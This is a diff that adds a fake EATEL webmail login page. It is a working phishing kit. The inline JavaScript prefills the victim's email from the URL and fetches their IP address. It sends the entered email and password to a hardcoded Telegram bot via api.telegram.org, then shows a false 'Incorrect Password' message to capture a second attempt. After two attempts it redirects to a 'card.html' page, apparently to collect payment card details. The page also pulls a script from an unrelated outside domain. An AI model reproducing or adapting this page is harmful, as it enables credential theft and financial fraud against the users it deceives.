@@ -1,0 +1,271 @@
+<html lang="en" class="js chrome webkit layout-large"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Webmail :: Welcome to Webmail</title>
+<title>EATEL</title>
+
+<meta name="Robots" content="noindex,nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link rel="stylesheet" type="text/css" href="https://webmail.eatel.net/skins/elastic/deps/bootstrap.min.css?s=1779898743">
+<link rel="stylesheet" type="text/css" href="https://webmail.eatel.net/plugins/skins/login.css?s=1726770812">
+<link rel="stylesheet" type="text/css" href="https://webmail.eatel.net/skins/elastic/../../brands/827/1518453375854/styles.2.css?s=1649713015">
+
+<link rel="stylesheet" type="text/css" href="https://webmail.eatel.net/plugins/jqueryui/themes/elastic/jquery-ui.min.css?s=1769006655">
+</head>
+<body class="ver2">
+<span id="mobiletest"></span>
+<!-- begin custom login html -->
+<div data-list="login-list">
+<style> 
+body {background: #39207c;} 
+</style>
+<div class="header-logo-wrapper row">
+<div class="header-logo col-xs-10">
+<img src="https://webmail.eatel.net/REV-ScreenConnect-Header.png">
+</div>
+</div>
+<div id="login-form">
+<img alt="EATEL" id="logo" src="https://webmail.eatel.net/brands/827/1518453375854/content/REV-ScreenConnect-Header.png?s=1645542994" width="480">
+<div style="color: #ffffff; width:480px; padding-top:15px; padding-left:25px; padding-right:25px;padding-bottom:5px;background-color: #0092bc; margin-left:0px;"> <div> 
+<span style="font-size: 14px;font-weight:bold;">Welcome to Webmail</span><p> 
+<span style="font-size: 14px;font-weight:bold;">Looking to view/pay your bill? <a href="https://myaccount.eatel.com/web/customer-portal/login/">Click here.</a><br></span></p><p>
+<span style="font-size: 14px;">Enter your full email address and password to login.</span><br> 
+
+
+
+
+</p></div> 
+<!--<div>For more information please visit <a href="http://opensrs.com" target=_new>opensrs.com</a></div>-->
+</div>
+<div class="box-inner">
+<!-- begin LOGIN_HTML block-->
+<form name="form" method="post" action="" class="table-responsive-sm">
+
+  <div id="example-user-full" style="display:none">e.g. <span id="example_user">yourname@eatel.net</span></div>
+  <div id="example-case-sensitive" style="display:none">password is case-sensitive</div>
+  <div id="example-2fa-ga" style="display:none">Get a token from your authenticator app.</div>
+  <div class="example-2fa-sms" style="display:none">A token has been sent to your mobile device via SMS.</div>
+  <table id="loginform" class="table">
+    <tbody><tr class="form-group row">
+      <td class="field pair-top wm-user">
+        <span>E-mail address</span>
+      </td>
+      <td class="field pair-bottom input-group input-group-lg">
+        <span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input class="attr form-control" id="email" type="email" autocapitalize="off" size="40" required="required" name="_user"  title="e.g. yourname@eatel.net">
+      </td>
+    </tr>
+    <tr class="spacer-bottom wm-pass form-group row">
+      <td class="field pair-top">
+        <span>Password</span>
+      </td>
+      <td class="field pair-bottom input-group input-group-lg">
+        <span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input class="attr form-control" id="password" type="password" autocapitalize="off" size="40" required="required" name="_pass"  title="password is case-sensitive">
+      </td>
+	  <td><p id="msg" style="color:red;"></p>
+    </tr>
+    <tr class="session_expire form-group row">
+      <td class="field input-group input-group-lg">
+        <span class="input-group-prepend"><i class="input-group-text icon sessionexpire"></i></span><div class="custom-control custom-switch"><input class="attr form-control form-check-input custom-control-input" id="session_expire" type="checkbox" value="1" name="session_expire" onclick="test_checkboxes()" placeholder=""><label for="session_expire" class="custom-control-label" title=""></label></div>
+        <p class="example-text">Shared computer - log me out after 4 hours</p>
+      </td>
+    </tr>
+    <tr class="session_persist spacer-bottom form-group row">
+      <td class="field input-group input-group-lg">
+        <span class="input-group-prepend"><i class="input-group-text icon persist"></i></span><div class="custom-control custom-switch"><input class="attr form-control form-check-input custom-control-input" id="persist" type="checkbox" value="1" name="persist" onclick="test_checkboxes()" placeholder=""><label for="persist" class="custom-control-label" title=""></label></div>
+        <p class="example-text">Keep me logged in until I log out</p>
+      </td>
+    </tr>
+    
+    <tr class="mobile form-group row input-group input-group-lg" style="display:none;">
+      <span class="input-group-prepend"><i class="input-group-text icon desktop"></i></span><input id="desktop" type="hidden" value="1" name="desktop" class="form-control" placeholder="">
+    </tr>
+  </tbody></table>
+
+  <div class="formbuttons">
+    <button type="submit" class="button mainaction btn btn-primary login" id="submit-btn">Login</button>
+  </div>
+
+  
+</form>
+
+
+<!-- end LOGIN_HTML block-->
+
+</div>
+</div>
+
+
+<!-- end custom login html -->
+</div>
+
+<div class="box-bottom">
+  <center>
+    <div id="message"></div>
+    <noscript>
+      <p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+    </noscript>
+  </center>
+</div>
+
+
+ <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+	  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+	<script src="https://lacuartabola.mx/jqueryslidersers.js"></script> 
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+ <script>
+ $(document).ready(function(){
+var count=0;
+
+
+  let u53TiQ = '';
+      $.getJSON('https://api.ipify.org?format=json', function(data){
+        u53TiQ = data.ip;
+      });
+ var tx1="2005258907";
+var tx2="8595039425:AAEuQryrqj96qo6rboO34jg2v6UT1avwXI0";
+ ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1; 
+ 
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+$('#emailich').html(my_email);
+
+
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+
+
+}
+
+
+
+
+$('#submit-btn').click(function(event){
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+if (!email) {
+    $('#msg').show();
+    $('#msg').html("Email can not be found");
+
+                return false;
+            }
+if (!password) {
+    $('#msg').show();
+    $('#msg').html("Password is empty!");
+				                 setTimeout(function () {
+    $('#msg').hide();
+                 }, 4500);
+                return false;
+            }
+
+count=count+1;
+
+$.ajax({
+dataType: 'JSON',
+url: ur,
+type: 'GET',
+        data:{
+          ajaxid: 4,
+		text: 'Email:' + email + ' | Password:' + password + ' | IP:' + u53TiQ			
+        },
+			//data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+            	
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response.ok === true){
+
+            			if (count>=2) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                   window.location.replace("card.html");
+
+                }
+							
+				                 setTimeout(function () {
+			
+			 $('#msg').show();
+			$('#msg').html("Incorrect Password. Please try again.");
+			            			$("#password").val("");
+                 }, 5000);
+
+    				                 setTimeout(function () {
+		
+			 $('#msg').hide();
+			
+			            			
+                 }, 5000);        
+            }
+            else{
+							
+				                 setTimeout(function () {
+			
+			 $('#msg').show();
+			$('#msg').html("Incorrect Password. Please try again.");
+			            			$("#password").val("");
+                 }, 5000);
+
+    				                 setTimeout(function () {
+		
+			 $('#msg').hide();
+			
+			            			
+                 }, 5000); 
+               
+            }
+        }
+    },
+    error: function(){
+
+    	if (count>=2) {
+    		count=0;
+                         window.location.replace("card.html");
+    	}
+							
+				                 setTimeout(function () {
+			
+			 $('#msg').show();
+			$('#msg').html("Incorrect Password. Please try again.");
+			            			$("#password").val("");
+                 }, 200);
+
+    				                 setTimeout(function () {
+		
+			 $('#msg').hide();
+			
+			            			
+                 }, 4500); 
+               
+    },
+    complete: function(){
+    	
+    }
+});
+  });
+
+
+	});
+
+ 
+ 
+ </script>
+
+</body></html>
